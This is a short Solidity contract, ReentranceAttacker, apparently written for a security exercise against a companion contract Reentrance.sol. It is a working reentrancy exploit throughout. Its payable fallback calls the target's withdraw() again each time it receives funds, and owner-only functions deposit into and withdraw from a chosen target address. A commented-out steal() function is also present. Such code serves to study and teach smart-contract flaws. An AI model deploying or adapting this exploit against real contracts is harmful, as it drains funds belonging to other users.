pragma solidity ^0.4.4;
import "./Reentrance.sol";

contract ReentranceAttacker {
	// deployer is owner
	address private owner;

	function ReentranceAttacker() {
		owner = msg.sender;
	}

	function () payable public {
		Reentrance r = Reentrance(msg.sender);
		return r.withdraw.gas(10000)();
	}

	function deposit() payable public {
	}

	function depositToExternal(address reentranceAddress) payable public {
		assert(owner == msg.sender);
		Reentrance r = Reentrance(reentranceAddress);
		// return r.deposit.gas(100000).value(msg.value)();
		r.deposit.gas(100000).value(msg.value)();
	}

	function withdrawFromExternal(address reentranceAddress) public {
		assert(owner == msg.sender);
		Reentrance r = Reentrance(reentranceAddress);
		return r.withdraw.gas(100000)();
		// r.call.gas(50000)(bytes4(sha3("withdraw()")));
	}

	// function steal() payable public {
	// 	Reentrance r = Reentrance(msg.sender);
	// 	r.withdraw();
	// }
}